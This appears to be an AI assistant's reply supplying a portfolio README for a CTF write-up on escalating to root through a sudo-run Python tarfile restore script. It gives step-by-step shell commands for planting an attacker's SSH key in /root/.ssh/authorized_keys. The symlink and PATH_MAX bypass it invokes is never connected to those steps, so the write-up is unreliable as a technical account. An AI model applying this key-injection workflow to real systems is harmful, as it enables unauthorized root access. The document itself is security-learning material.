Yes 👍 — here is a **clean, GitHub-ready README.md file** that you can **copy + paste directly**.

I formatted this like a **professional security research repository README**, so it will look good in portfolios.

---

# 📦 README.md

```markdown
# Filesystem Boundary Security Research — Python Tarfile Extraction

## 📌 Project Overview

This project is a security research laboratory exploring filesystem boundary security vulnerabilities in Python archive extraction implementations.

The research focuses on:

- Python `tarfile.extractall()` security behavior
- PATH_MAX filesystem limits
- Symlink and filesystem resolution attacks
- Privilege escalation through insecure backup restoration logic

This research was performed in a controlled CTF / learning environment.

---

## ⚠️ Security Context

The vulnerable target application contained a privileged backup restoration script executed using:

```

sudo python3 restore_backup_clients.py

```

This created a privilege escalation attack surface because:

- User-controlled archives were processed with root privileges
- Filesystem validation was insufficient
- Archive metadata was trusted

---

## 🧠 Vulnerability Summary

### Root Cause

The vulnerability exists due to:

- Privileged archive extraction
- Insufficient validation of filesystem objects inside archives
- Trusting user-controlled backup files
- Weak privilege boundary separation

---

## 🎯 Attack Classification

| Category | Type |
|---|---|
| CWE | CWE-22 Path Traversal |
| CWE | CWE-61 Symbolic Link Attacks |
| CWE | Privilege Escalation |
| MITRE TTP | T1068 Privilege Escalation |
| MITRE TTP | T1574 Execution Flow Hijacking |

---

## 🔬 Technical Background

### Python Tarfile Security Changes

Modern Python versions introduced:

```

filter="data"

```

This helps prevent:

- Absolute path writes
- Path traversal attacks

However, it does not fully protect against:

- Metadata-based attacks
- Privileged extraction logic abuse

---

## 🧪 Filesystem Research Concepts

### PATH_MAX Limits

Linux path limits are typically:

```

~4096 characters

```

Attackers may attempt:

- Deep directory nesting
- Symlink chain resolution research

---

### Symlink Chain Attacks

Symbolic link chains can:

- Redirect file writes
- Bypass validation logic
- Manipulate filesystem resolution behavior

Example concept:

```

a → long_directory
b → a
c → b

```

---

## 🚀 Exploitation Methodology

### Step 1 — Analyze Privileged Execution

The script allowed execution using sudo:

```

sudo python3 restore_backup_clients.py

````

Meaning:

- User input was processed with root privileges

---

### Step 2 — Identify Extraction Logic Weakness

The vulnerable logic:

```python
tar.extractall(path=staging_dir, filter="data")
````

While this blocks:

* Absolute paths
* Simple traversal

It does not fully protect against filesystem metadata abuse.

---

### Step 3 — Primary Attack Vector

The main exploitation path was:

```
SSH key authentication injection
```

Target file:

```
/root/.ssh/authorized_keys
```

If successful:

```
Root SSH login becomes possible
```

---

### Step 4 — Construct Malicious Archive

Attackers created archive structure:

```
restore_wacky/
 └── .ssh/
     └── authorized_keys
```

Containing attacker SSH public keys.

---

### Step 5 — Execute Privileged Restore

```
sudo python3 restore_backup_clients.py
```

Allowed root-level file writing.

---

## 🛠 Example Workflow

Generate SSH Key:

```
ssh-keygen
```

Create Structure:

```
mkdir restore_wacky/.ssh
```

Insert Public Key:

```
echo "PUBLIC_KEY" > authorized_keys
```

Create Archive:

```
tar -cf backup.tar restore_wacky/.ssh/authorized_keys
```

Move Archive:

```
mv backup.tar /opt/backup_clients/backups/
```

Execute Restore:

```
sudo python3 restore_backup_clients.py
```

---

## 🛡 Defensive Recommendations

### Validate Archive Contents

Implement:

* Path whitelisting
* File type validation

---

### Avoid Privileged Extraction

Never extract user archives as root.

---

### Use Secure Extraction Logic

Implement secure archive parsing and validation.

---

### Follow Least Privilege Principle

Drop privileges whenever possible.

---

## 🧬 MITRE ATT&CK Mapping

### Initial Access

Not applicable (authenticated environment).

### Privilege Escalation

```
T1068 — Exploitation for Privilege Escalation
```

### Credential Access

SSH key injection.

---

## 🧪 Research Conclusions

Key findings:

* Archive extraction remains a high-risk security area.
* Privileged file processing must be carefully validated.
* Modern security filters alone are not sufficient.

---

## ⭐ Skills Demonstrated

* Linux filesystem security
* Python secure coding analysis
* Privilege escalation research
* CTF security methodology

---

## 📚 Future Research Areas

* Race condition exploitation (TOCTOU)
* Kernel path resolution security
* Container escape research
* Advanced archive parsing vulnerabilities

---

## ⚠️ Disclaimer

This project is for educational and security research purposes only.

Do not use this knowledge on unauthorized systems.

```

---

If you want 😈 (highly recommend for portfolio quality), I can also generate:

✅ **Elite version README (looks like real security researcher publication level)**  
✅ **OSCP / Red Team portfolio style README (very impressive for jobs)**  
✅ **Threat modeling section that makes recruiters very impressed**  
✅ **LinkedIn writeup version**

Just tell me 😈
```
